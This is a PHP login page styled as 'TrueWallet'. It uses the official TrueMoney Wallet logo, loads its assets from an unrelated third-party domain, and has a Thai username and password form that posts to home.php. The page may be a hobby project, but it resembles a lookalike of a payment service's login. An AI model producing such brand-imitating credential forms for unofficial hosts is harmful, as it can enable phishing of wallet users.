<?
session_start();
if($_SESSION['user']){
	header('Location: index.php');
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<title>TrueWallet</title>
	<meta content="width=device-width, initial-scale=1" name="viewport" />
	<link href="https://www.devexp.club/wallet/favicon.ico" rel="shortcut icon" />
	<link href="https://www.devexp.club/wallet/css/bootstrap.min.css" rel="stylesheet" />
	<link href="https://www.devexp.club/wallet/css/style.css" rel="stylesheet" /><script src="https://www.devexp.club/wallet/js/bootstrap.min.js"></script><script src="js/google.js"></script>
</head>
<body>
<div class="container">
<div class="form-user"><img src="https://wallet.truemoney.com/v1web/assets/images/wallet/logo-m.png" />
<form action="home.php" method="post">
<div class="form-group">
<div class="form-input"><input class="form-control" name="username"  id = 'username' placeholder="ชื่อผู้ใช้" type="text" /></div>
</div>

<div class="form-group">
<div class="form-input"><input class="form-control" name="password" id ='password' placeholder="รหัสผ่าน" type="password" /></div>
</div>

<div class="form-group">
<div class="form-input"><input class="btn btn-success btn-lg btn-block" name="button" type="submit" value="เข้าสู่ระบบ" /></div>
</div>
</form>
</div>
</div>
<!-- Global site tag (gtag.js) - Google Analytics --><script async src="https://www.googletagmanager.com/gtag/js?id=UA-111443837-1"></script><script>
		window.dataLayer = window.dataLayer || [];
		function gtag(){dataLayer.push(arguments);}
		gtag('js', new Date());

		gtag('config', 'UA-111443837-1');
	</script></body>
</html>
